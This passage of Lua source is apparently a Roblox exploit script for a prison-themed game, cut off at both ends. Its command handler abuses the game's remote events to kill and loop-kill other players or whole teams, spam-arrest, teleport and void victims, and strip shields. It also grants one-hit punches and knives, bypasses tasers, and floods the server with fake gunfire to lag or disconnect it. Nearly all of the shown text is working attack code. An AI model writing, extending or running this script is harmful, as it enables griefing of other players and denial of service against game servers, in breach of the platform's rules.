		if Command("criminal") or Command("criminals") or Command("crim") or Command("crims") or Command("crimes") or Command("crime") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Become a criminal", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("neutral") or Command("neutrals") then
			workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			Notify("Become neutral", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("red") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright red").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("blue") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Deep blue").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("black") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really black").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("pink") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Hot pink").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("grey") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Ghost grey").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("white") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("White").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("brown") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Brown").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("purple") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Royal purple").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("green") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright green").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("yellow") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright yellow").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("orange") then
			local savedcf = GetPos()
			local savedcamcf = GetCamPos()
			workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Neon orange").Name)
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			workspace.CurrentCamera.CFrame = savedcamcf
			Notify("Changed name tag color to "..Arg1:split("."), Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("chatnotify") then
			States.ChatNotify = true
			Notify("Turn chat notify on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nochatnotify") or Command("unchatnotify") then
			States.ChatNotify = false
			Notify("Turn chat notify off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("taserbypass") or Command("lock") or Command("antitaser") then
			States.TaserBypass = true
			Notify("Turn taser bypass on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.CharacterAdded:Connect(function()
				if States.TaserBypass then
					wait(.2)
					game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = true
					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
					game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
				end
			end)
		end
		if Command("notaserbypass") or Command("unlock") or Command("untaserbypass") then
			States.TaserBypass = false
			Notify("Turn taser bypass off", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character.ClientInputHandler.Disabled = false
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
		end
		if Command("color") then
			if Arg2 ~= nil and Arg3 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 == nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			elseif Arg2 ~= nil and Arg3 ~= nil and Arg4 ~= nil then
				local savedcf = GetPos()
				workspace.Remote.loadchar:InvokeServer(nil, Arg2.." "..Arg3.." "..Arg4)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
			end
			Notify("Changed name tag color", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("print") then
			print(Message)
			Notify("Printed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("warn") then
			warn(Message)
			Notify("Warned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("error") then
			Notify("Printed error", Color3.fromRGB(0, 255, 0), "Success")
			error(Message)
		end
		if Command("chat") then
			Chat(Message)
			Notify("Chatted", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("copychat") then
			States.CopyChat = true
			Notify("Turn copy chat on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("uncopychat") then
			States.CopyChat = false
			Notify("Turn copy chat off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("tase") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Tase(Player)
				Notify("Tased "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("noshield") or Command("antishield") then
			States.Anti_Shield = true
			Notify("Turn anti shield users on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				for i,v in pairs(game.Players:GetPlayers()) do
					pcall(function()
						if workspace[v.Name].Torso:FindFirstChild("ShieldFolder") then
							workspace[v.Name].Torso:FindFirstChild("ShieldFolder"):Destroy()
						end
					end)
				end
			end
		end
		if Command("unantishield") then
			States.Anti_Shield = false
			Notify("Turn anti shield users off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("kill") or Command("kills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Kill(Player)
				Notify("Killed "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killall") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					Kill(v)
				end
			end
			Notify("Killed all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killinmate") or Command("killinmates") or Command("killsinmate") or Command("killsinmates") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright orange" then
						Kill(v)
					end
				end
			end
			Notify("Killed all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killguard") or Command("killsguard") or Command("killguards") or Command("killsguards") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Bright blue" then
						Kill(v)
					end
				end
			end
			Notify("Killed all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("killcriminal") or Command("killscriminal") or Command("killcriminals") or Command("killscriminals") then
			for i,v in pairs(game.Players:GetPlayers()) do
				if v ~= game.Players.LocalPlayer then
					if v.TeamColor.Name == "Really red" then
						Kill(v)
					end
				end
			end
			Notify("Killed all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkill") or Command("loopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and not LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = {Player = Player}
				Notify("Looping kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / already loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("unloopkill") or Command("unloopkills") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil and LoopKill[Player.UserId] then
				LoopKill[Player.UserId] = nil
				Notify("Unloop kills "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found / Player has no loop kills", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("loopkillguard") or Command("loopkillguards") or Command("loopkillsguard") or Command("loopkillsguards") or Command("loopkillcop") or Command("loopkillpolices") or Command("loopkillspolices") then
			States.LoopKill_Guards = true
			Notify("Looping kills all guards", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Guards then
					for i,v in pairs(game.Teams.Guards:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillguard") or Command("unloopkillguards") or Command("unloopkillsguard") or Command("unloopkillsguards") or Command("unloopkillcop") or Command("unloopkillpolices") or Command("unloopkillspolices") then
			States.LoopKill_Guards = false
			Notify("Unloop kills all guards", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillinmate") or Command("loopkillinmates") or Command("loopkillsinmate") or Command("loopkillsinmates") or Command("loopkillprisoner") or Command("loopkillprisoners") then
			States.LoopKill_Inmates = true
			Notify("Looping kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Inmates then
					for i,v in pairs(game.Teams.Inmates:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillinmate") or Command("unloopkillinmates") or Command("unloopkillsinmate") or Command("unloopkillsinmates") or Command("unloopkillprisoner") or Command("unloopkillprisoners") then
			States.LoopKill_Inmates = false
			Notify("Unloop kills all inmates", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillcriminal") or Command("loopkillcriminals") or Command("loopkillscriminal") or Command("loopkillscriminals") or Command("loopkillcrim") or Command("loopkillcrims") then
			States.LoopKill_Criminals = true
			Notify("Looping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Criminals then
					for i,v in pairs(game.Teams.Criminals:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillcriminal") or Command("unloopkillcriminals") or Command("unloopkillscriminal") or Command("unloopkillscrriminals") or Command("unloopkillcrim") or Command("unloopkillcrims") then
			States.LoopKill_Criminals = false
			Notify("Unlooping kills all criminals", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("loopkillall") or Command("loopkillsall") then
			States.LoopKill_Others = true
			Notify("Looping kills all players", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.LoopKill_Others then
					for i,v in pairs(game.Players:GetPlayers()) do
						if v ~= game.Players.LocalPlayer then
							pcall(function()
								if v.Character.Humanoid.Health > 0 and v.Character.Head and v.Character and v ~= nil then
									Kill(v)
								end
							end)
						end
					end
				end
			end
		end
		if Command("unloopkillall") or Command("unloopkillsall") then
			States.LoopKill_Criminals = false
			States.LoopKill_Guards = false
			States.LoopKill_Inmates = false
			States.LoopKill_Others = false
			Notify("Unlooping kills all players", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("goto") or Command("to") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace[Player.Name].HumanoidRootPart.CFrame
				Notify("Go to "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("re") or Command("refresh") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
				end
			else
				if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
					local savedcf = GetPos()
					local savedcamcf = GetCamPos()
					workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
					workspace.CurrentCamera.CFrame = savedcamcf
					workspace.Remote.TeamEvent:FireServer("Medium stone grey")
				end
			end
			Notify("Refreshed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("res") or Command("respawn") then
			if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
				workspace.Remote.loadchar:InvokeServer()
			else
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
				local savedcf = GetPos()
				local savedcamcf = GetCamPos()
				workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Really red").Name)
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
				workspace.CurrentCamera.CFrame = savedcamcf
				workspace.Remote.TeamEvent:FireServer("Medium stone grey")
			end
			Notify("Respawned", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("looparrest") or Command("spamarrest") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Notify("Spam arresting "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
				States.SpamArrest = true
				repeat wait()
					if game.Players[Player.Name] and States.SpamArrest then
						local Player_Previos_Team = Player.TeamColor.Name
						if Player.TeamColor.Name == "Bright orange" then
							Teleport(Player, CFrame.new(979.55584716797, 99.990005493164, 2341.4069824219))
						end
						if Player.TeamColor.Name ~= "Bright orange" and Player.TeamColor.Name ~= "Really red" then
							repeat Teleport(Player, CFrame.new(-976, 110, 2070)) until Player.TeamColor.Name == "Really red" or not game.Players[Player.Name]
						end
						if Player_Previos_Team == "Bright orange" then
							repeat wait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
								for i = 1,1000 do
									coroutine.wrap(function()
										ArrestEvent(Player, math.huge)
									end)()
								end
							until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
						else
							if Player.TeamColor.Name == "Really red" then
								repeat wait()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 1)
									for i = 1,1000 do
										coroutine.wrap(function()
											ArrestEvent(Player, math.huge)
										end)()
									end
								until Player.Character.Head:FindFirstChild("handcuffedGui") or not game.Players[Player.Name]
							end
						end
					end
				until not game.Players[Player.Name] or not States.SpamArrest
			end
		end
		if Command("unlooparrest") or Command("unspamarrest") then
			States.SpamArrest = false
			Notify("Unspam arrest", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("view") or Command("spectate") or Command("watch") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Watching = Player
				Notify("Viewing "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
			while wait() do
				if Watching ~= nil then
					pcall(function()
						workspace.CurrentCamera.CameraSubject = workspace[Watching.Name]
					end)
				end
			end
		end
		if Command("antifling") then
			States.Anti_Fling = true
			Notify("Turn anti fling on", Color3.fromRGB(0, 255, 0), "Success")
			game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
			game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
				if States.Anti_Fling then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size = Vector3.new(math.huge, game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Size.Y, math.huge)
					end)
				end
			end)
		end
		if Command("statue") then
			States.Statue = true
			game.Players.LocalPlayer.Character:Connect(function()
				if States.Statue then

				end
			end)
		end
		if Command("unstatue") then
			States.Statue = false
		end
		if Command("noclip") or Command("noclips") then
			States.Noclips = true
			Notify("Turn no clips on", Color3.fromRGB(0, 255, 0), "Success")
			game:GetService("RunService").Stepped:Connect(function()
				if States.Noclips then
					pcall(function()
						game.Players.LocalPlayer.Character:FindFirstChild("Head").CanCollide = false
						game.Players.LocalPlayer.Character:FindFirstChild("Torso").CanCollide = false
					end)
				end
			end)
		end
		if Command("clip") or Command("clips") then
			States.Noclips = false
			Notify("Turn no clips off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unantifling") then
			States.Anti_Fling = false
			Notify("Turn anti fling off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivest") or Command("anticrash") then
			States.Anti_Crash = true
			Notify("Turn anti armor spammer on", Color3.fromRGB(0, 255, 0), "Success")
			coroutine.wrap(function()
				while wait() do
					if States.Anti_Crash then
						for i,v in pairs(game.Players:GetPlayers()) do
							pcall(function()
								v.Character.vest:Destroy()
							end)
						end
					end
				end
			end)()
		end
		if Command("unantivest") or Command("unanticrash") then
			States.Anti_Crash = false
			Notify("Turn anti armor spammer off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("fastpunch") or Command("speedpunch") or Command("speedlypunch") or Command("superspeedpunch") then
			States.Fast_Punch = true
			Notify("Turn fast punch on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("slowpunch") or Command("normalspeedpunch") or Command("nofastpunch") or Command("unfastpunch") then
			States.Fast_Punch = false
			Notify("Turn fast punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superpunch") or Command("onepunch") then
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local MeleeEvent = ReplicatedStorage:FindFirstChild("meleeEvent")
			local Mouse = game.Players.LocalPlayer:GetMouse()
			local Punch = false
			local Cooldown = false
			States.SuperPunch = true
			Notify("Turn super punch on", Color3.fromRGB(0, 255, 0), "Success")

			local function Punch()
				if not States.Fast_Punch then
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.9)
					Cooldown = false
					Part:Destroy()
				else
					Cooldown = true
					local Part = Instance.new("Part", game.Players.LocalPlayer.Character)
					Part.Transparency = 1
					Part.Size = Vector3.new(5, 2, 3)
					Part.CanCollide = false
					local Weld = Instance.new("Weld", Part)
					Weld.Part0 = game.Players.LocalPlayer.Character.Torso
					Weld.Part1 = Part
					Weld.C1 = CFrame.new(0, 0, 2)
					Part.Touched:connect(function(Touch)
						if game.Players:FindFirstChild(Touch.Parent.Name) then
							local plr = game.Players:FindFirstChild(Touch.Parent.Name) 
							if plr.Name ~= game.Players.LocalPlayer.Name then
								Part:Destroy()
								for i = 1,100 do
									MeleeEvent:FireServer(plr)
								end
							end
						end
					end)
					wait(0.1)
					Cooldown = false
					Part:Destroy()
				end
			end
			Mouse.KeyDown:connect(function(Key)
				if not Cooldown and States.SuperPunch then
					if Key:lower() == "f" then
						Punch()
					end				
				end
			end)
		end
		if Command("normalpunch") or Command("oldpunch") or Command("nosuperpunch") or Command("stoponepunch") or Command("unonepunch") or Command("unsuperpunch") then
			States.SuperPunch = false
			Notify("Turn super punch off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("superknife") then
			local Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if not Knife then
				workspace.Remote.ItemHandler:InvokeServer(workspace["Prison_ITEMS"].single["Crude Knife"].ITEMPICKUP)
			end
			wait()
			Knife = game.Players.LocalPlayer.Backpack:FindFirstChild("Crude Knife") or game.Players.LocalPlayer.Character:FindFirstChild("Crude Knife")
			if Knife then
				local Cooldown = false
				local Hitting = false
				local Hitted = false
				Knife.Equipped:Connect(function()
					Knife.Activated:Connect(function()
						if not Cooldown then
							Cooldown = true
							Hitting = true
							for i,v in pairs(Knife:GetChildren()) do
								if v:IsA("Part") then
									v.Touched:Connect(function(Hit)
										if Hit and Hit.Parent ~= game.Players.LocalPlayer and not Hitted and Hitting then
											Hitted = true
											for i = 1,25 do
												game.ReplicatedStorage.meleeEvent:FireServer(game.Players[Hit.Parent.Name])
											end
										end
									end)
								end
							end
							wait(0.5)
							Cooldown = false
							Hitting = false
							Hitted = false
						end
					end)
				end)
			end
			Notify("Obtained super knife", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("unview") or Command("unspectate") or Command("stopwatch") or Command("unwatch") then
			Watching = nil
			workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			Notify("Unviewed", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("antivoid") or Command("antifell") then
			States.Anti_Void = true
			Notify("Turn anti void on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Anti_Void then
					pcall(function()
						if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < 1 then
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(888, 100, 2388)
						end
					end)
				end
			end
		end
		if Command("unantivoid") or Command("unantifell") then
			States.Anti_Void = false
			Notify("Turn anti void off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("bring") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(GetPlayer(Arg2), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame)
				Notify("Brought "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("teleport") or Command("tp") then
			local Player = GetPlayer(Arg2)
			local Player2 = GetPlayer(Arg3)
			if Player ~= nil and Player2 ~= nil then
				TeleportV(Player, Player2)
				Notify("Teleported "..Player.Name.." to "..Player2.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(0, 255, 0), "Error")
			end
		end
		if Command("void") then
			local Player = GetPlayer(Arg2)
			if Player ~= nil then
				Teleport(Player, CFrame.new(999999, 999999, 999999))
				Notify("Voided "..Player.Name, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("No player found", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("killaura") then
			States.Kill_Aura = true
			Notify("Turn kill aura on", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("nokillaura") or Command("unkillaura") then
			States.Kill_Aura = false
			Notify("Turn kill aura off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("auto") or Command("autore") or Command("autorefresh") then
			States.Auto_Refresh = true
			Notify("Turn auto refresh on", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Auto_Refresh == true then
					pcall(function()
						if game.Players.LocalPlayer.Character.Humanoid.Health < 1 then
							if game.Players.LocalPlayer.TeamColor.Name ~= "Medium stone grey" then
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer()
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
								end
							else
								if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
									local savedcf = GetPos()
									local savedcamcf = GetCamPos()
									workspace.Remote.loadchar:InvokeServer(nil, BrickColor.new("Bright orange").Name)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = savedcf
									workspace.CurrentCamera.CFrame = savedcamcf
									workspace.Remote.TeamEvent:FireServer("Medium stone grey")
								end
							end
						end
					end)
				end
			end
		end
		if Command("unauto") or Command("auntore") or Command("unautorefresh") then
			States.Auto_Refresh = false
			Notify("Turn auto refresh off", Color3.fromRGB(0, 255, 0), "Success")
		end
		if Command("prefix") or Command("newprefix") or Command("changeprefix") then
			local NewPrefix = Arg2
			if NewPrefix ~= nil then
				Prefix = NewPrefix
				Execute.PlaceholderText = "Press "..Prefix.." To Enter"
				Notify("Changed prefix to "..NewPrefix, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Text needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("speed") or Command("walkspeed") or Command("setspeed") or Command("setwalkspeed") then
			local WalkSpeed = tonumber(Arg2)
			if WalkSpeed ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = WalkSpeed
				Notify("Changed walk speed to "..WalkSpeed, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("jumppower") or Command("jumphigh") or Command("setjumppower") then
			local JumpPower = tonumber(Arg2)
			if JumpPower ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.JumpPower = JumpPower
				Notify("Changed jump power to "..JumpPower, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("hipheight") or Command("sethipheight") then
			local HipHeight = tonumber(Arg2)
			if HipHeight ~= nil then
				game.Players.LocalPlayer.Character.Humanoid.HipHeight = HipHeight
				Notify("Changed hip height to "..HipHeight, Color3.fromRGB(0, 255, 0), "Success")
			else
				Notify("Counts needed", Color3.fromRGB(255, 0, 0), "Error")
			end
		end
		if Command("lagserver") or Command("disconnect") then
			States.Lag_Server = true
			Notify("Lagging server", Color3.fromRGB(0, 255, 0), "Success")
			while wait() do
				if States.Lag_Server then
					coroutine.wrap(function()
						pcall(function()
							workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)

							local Gun = game.Players.LocalPlayer.Backpack["Remington 870"] or game.Players.LocalPlayer.Character["Remington 870"]

							local args = {
								[1] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [2] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [3] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [4] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [5] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
									["Cframe"] = CFrame.new(), 
									["Hit"] = workspace[game.Players.LocalPlayer.Name].Head
								}, [6] = {
									["RayObject"] = Ray.new(Vector3.new(), Vector3.new()), 
									["Distance"] = 0, 
